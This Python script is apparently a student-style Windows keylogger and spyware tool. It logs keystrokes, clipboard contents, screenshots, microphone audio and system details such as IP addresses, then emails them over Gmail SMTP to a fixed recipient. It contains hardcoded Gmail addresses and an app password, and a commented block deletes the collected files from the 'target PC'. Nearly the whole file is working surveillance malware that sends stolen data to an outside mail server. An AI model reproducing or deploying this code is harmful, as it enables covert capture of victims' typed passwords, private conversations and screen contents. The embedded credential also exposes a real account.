# Libraries
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.message import EmailMessage
import pyaudio
import wave
import socket
import platform
import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "Key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
microphone_time = 10
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
time_iteration = 20
number_of_iterations_end = 1


keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"


file_path = "C:\\path_to_file"
extend = "\\"
file_merge = file_path + extend

# email functionality
def send_email1():

    # Define email sender and receiver
    email_sender = 'dharaneeshcs@gmail.com'
    email_password = 'qdna ymjo whhe olsm'
    email_receiver = 'shivavarunika001@gmail.com'
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587 

    # Set the subject and body of the email
    subject = ' Keylogger'
    body = """
    Keylogger data
    """
    message = MIMEMultipart()
    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['Subject'] = subject
    em.set_content(body)
    text_file = 'C:\\path_to_file\\systeminfo.txt'
    with open(text_file, 'rb') as file:
        attachment = MIMEApplication(file.read(), _subtype="txt")
        attachment.add_header('Content-Disposition', 'attachment', filename='systeminfo.txt')
        message.attach(attachment)

    
    # Add email body (optional)
    message.attach(MIMEText('Hello, please find the attached text file.', 'plain'))
    context = ssl.create_default_context()

    # Log in and send the email
    server = smtplib.SMTP(smtp_server, smtp_port)

    # Start TLS for security
    server.starttls()

    # Login to your Gmail account
    server.login(email_sender, email_password)

    # Send the email
    server.sendmail(email_sender, email_receiver, message.as_string())

    # Quit the server
    server.quit()


def send_email2():

    # Define email sender and receiver
    email_sender = 'dharaneeshcs@gmail.com'
    email_password = 'qdna ymjo whhe olsm'
    email_receiver = 'shivavarunika001@gmail.com'
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587 

    # Set the subject and body of the email
    subject =' Keylogger data  '
    body = """
     Keylogger data
    """
    message = MIMEMultipart()
    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['Subject'] = subject
    em.set_content(body)
    text_file = 'C:\\path_to_file\\Key_log.txt'
    with open(text_file, 'rb') as file:
        attachment = MIMEApplication(file.read(), _subtype="txt")
        attachment.add_header('Content-Disposition', 'attachment', filename='Key_log.txt')
        message.attach(attachment)
    
    # Add email body (optional)
    message.attach(MIMEText('Hello, please find the attached text file.', 'plain'))
    context = ssl.create_default_context()

    # Log in and send the email
    server = smtplib.SMTP(smtp_server, smtp_port)

    # Start TLS for security
    server.starttls()

    # Login to your Gmail account
    server.login(email_sender, email_password)

    # Send the email
    server.sendmail(email_sender, email_receiver, message.as_string())

    # Quit the server
    server.quit()

def send_email3():

    # Define email sender and receiver
    email_sender = 'dharaneeshcs@gmail.com'
    email_password = 'qdna ymjo whhe olsm'
    email_receiver = 'shivavarunika001@gmail.com'
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587 

    # Set the subject and body of the email
    subject = 'Keylogger'
    body = """
    Keylogger data
    """
    message = MIMEMultipart()
    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['Subject'] = subject
    em.set_content(body)
    text_file = 'C:\\path_to_file\\screenshot.png'
    with open(text_file, 'rb') as file:
        attachment = MIMEApplication(file.read(), _subtype="txt")
        attachment.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
        message.attach(attachment)
    
    # Add email body (optional)
    message.attach(MIMEText('Hello, please find the attached text file.', 'plain'))
    context = ssl.create_default_context()

    # Log in and send the email
    server = smtplib.SMTP(smtp_server, smtp_port)

    # Start TLS for security
    server.starttls()

    # Login to your Gmail account
    server.login(email_sender, email_password)

    # Send the email
    server.sendmail(email_sender, email_receiver, message.as_string())

    # Quit the server
    server.quit()

def send_email4():

    # Define email sender and receiver
    email_sender = 'dharaneeshcs@gmail.com'
    email_password = 'qdna ymjo whhe olsm'
    email_receiver = 'shivavarunika001@gmail.com'
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587 

    # Set the subject and body of the email
    subject = ' Keylogger'
    body = """
    Keylogger data
    """
    message = MIMEMultipart()
    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['Subject'] = subject
    em.set_content(body)
    text_file = 'e:\\kishore\\output.mp3'
    with open(text_file, 'rb') as file:
        attachment = MIMEApplication(file.read(), _subtype="mp3")
        attachment.add_header('Content-Disposition', 'attachment', filename='output.mp3')
        message.attach(attachment)

    
    # Add email body (optional)
    message.attach(MIMEText('Hello, please find the attached text file.', 'plain'))
    context = ssl.create_default_context()

    # Log in and send the email
    server = smtplib.SMTP(smtp_server, smtp_port)

    # Start TLS for security
    server.starttls()

    # Login to your Gmail account
    server.login(email_sender, email_password)

    # Send the email
    server.sendmail(email_sender, email_receiver, message.as_string())

    # Quit the server
    server.quit()



#send_email(keys_information, file_path + extend + keys_information, toaddr)


# extract PC information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IpAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP address: " + public_ip)

        except Exception:
            f.write('Couldnt get Public IP address (most likely max query)\n')

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n' )
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IpAddr + '\n')


#computer_information()


# Clipboard information
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard couldnot be copied")

#copy_clipboard()

#capture microphone
# Constants
FORMAT = pyaudio.paInt16  # Format for audio input
CHANNELS = 1  # Number of audio channels (1 for mono, 2 for stereo)
RATE = 44100  # Sample rate (samples per second)
RECORD_SECONDS = 10  # Duration of the recording
WAVE_OUTPUT_FILENAME = "output.mp3"  # Output filename

# Initialize PyAudio
audio = pyaudio.PyAudio()

# Open a microphone stream
stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=1024)

print("Recording...")

frames = []
for _ in range(0, int(RATE / 1024 * RECORD_SECONDS)):
    data = stream.read(1024)
    frames.append(data)

print("Recording finished.")

# Stop and close the microphone stream
stream.stop_stream()
stream.close()

# Terminate PyAudio
audio.terminate()

# Save the recorded audio to a WAV file
with wave.open(WAVE_OUTPUT_FILENAME, "wb") as wf:
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b"".join(frames))
    print(f"Audio saved as {WAVE_OUTPUT_FILENAME}")

# microphone()


#get screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

#screenshot()


# how many times the keylogger runs
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:


    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()



    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        # with open(file_path + extend + keys_information, "w") as f:
        #     f.write(" ")

        screenshot()
        send_email1()
        send_email2()
        send_email3()
        send_email4()

        copy_clipboard()
        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

computer_information()
#copy_clipboard()\

time.sleep(10)

# remove files from target PC
# delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
# for file in delete_files:
#     os.remove(file_merge + file)

